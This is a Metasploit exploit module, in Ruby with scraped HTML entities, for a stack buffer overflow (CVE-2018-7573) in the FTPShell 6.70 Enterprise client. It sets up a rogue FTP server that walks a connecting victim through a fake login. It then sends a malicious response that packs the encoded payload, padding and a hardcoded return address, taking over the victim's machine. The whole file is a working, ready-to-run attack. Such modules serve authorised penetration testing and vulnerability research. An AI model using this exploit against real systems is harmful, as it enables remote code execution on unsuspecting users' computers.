# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::TcpServer

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;FTPShell client 6.70 (Enterprise edition) Stack Buffer Overflow&#039;,
      &#039;Description&#039;    => %q{
          This module exploits a buffer overflow in the FTPShell client 6.70 (Enterprise
          edition) allowing remote code execution.
        },
      &#039;Author&#039;   =>
        [
          &#039;r4wd3r&#039;,           # Original exploit author
          &#039;Daniel Teixeira&#039;   # MSF module author
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2018-7573&#039;],
          [ &#039;EDB&#039;, &#039;44596&#039; ]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;    => 400,
          &#039;BadChars&#039; => "\x00\x22\x0d\x0a\x0b"
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          # CALL ESI in FTPShell.exe : 0x00452eed
          [ &#039;Windows Universal&#039;, {&#039;Ret&#039; => "\xed\x2e\x45" } ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DefaultOptions&#039; =>
        {
          &#039;SRVHOST&#039; => &#039;0.0.0.0&#039;,
          &#039;EXITFUNC&#039; => &#039;thread&#039;
        },
      &#039;DisclosureDate&#039; => &#039;Mar 4 2017&#039;,
      &#039;DefaultTarget&#039;  => 0))

    register_options [ OptPort.new(&#039;SRVPORT&#039;, [ true, &#039;The FTP port to listen on&#039;, 21 ]) ]
  end

  def exploit
    srv_ip_for_client = datastore[&#039;SRVHOST&#039;]
    if srv_ip_for_client == &#039;0.0.0.0&#039;
      if datastore[&#039;LHOST&#039;]
        srv_ip_for_client = datastore[&#039;LHOST&#039;]
      else
        srv_ip_for_client = Rex::Socket.source_address(&#039;50.50.50.50&#039;)
      end
    end

    srv_port = datastore[&#039;SRVPORT&#039;]

    print_status("Please ask your target(s) to connect to #{srv_ip_for_client}:#{srv_port}")
    super
  end

  def on_client_connect(client)
    p = regenerate_payload(client)
    return if p.nil?
    print_status("#{client.peerhost} - connected.")

    res = client.get_once.to_s.strip
    print_status("#{client.peerhost} - Request: #{res}") unless res.empty?
    print_status("#{client.peerhost} - Response: Sending 220 Welcome")
    welcome = "220 Welcome.\r\n"
    client.put(welcome)

    res = client.get_once.to_s.strip
    print_status("#{client.peerhost} - Request: #{res}")
    print_status("#{client.peerhost} - Response: sending 331 OK")
    user = "331 OK.\r\n"
    client.put(user)

    res = client.get_once.to_s.strip
    print_status("#{client.peerhost} - Request: #{res}")
    print_status("#{client.peerhost} - Response: Sending 230 OK")
    pass = "230 OK.\r\n"
    client.put(pass)
    res = client.get_once.to_s.strip
    print_status("#{client.peerhost} - Request: #{res}")

    sploit = &#039;220 "&#039;
    sploit << payload.encoded
    sploit << "\x20" * (payload_space - payload.encoded.length)
    sploit << target.ret
    sploit << "\" is current directory\r\n"

    print_status("#{client.peerhost} - Request: Sending the malicious response")
    client.put(sploit)

  end
end

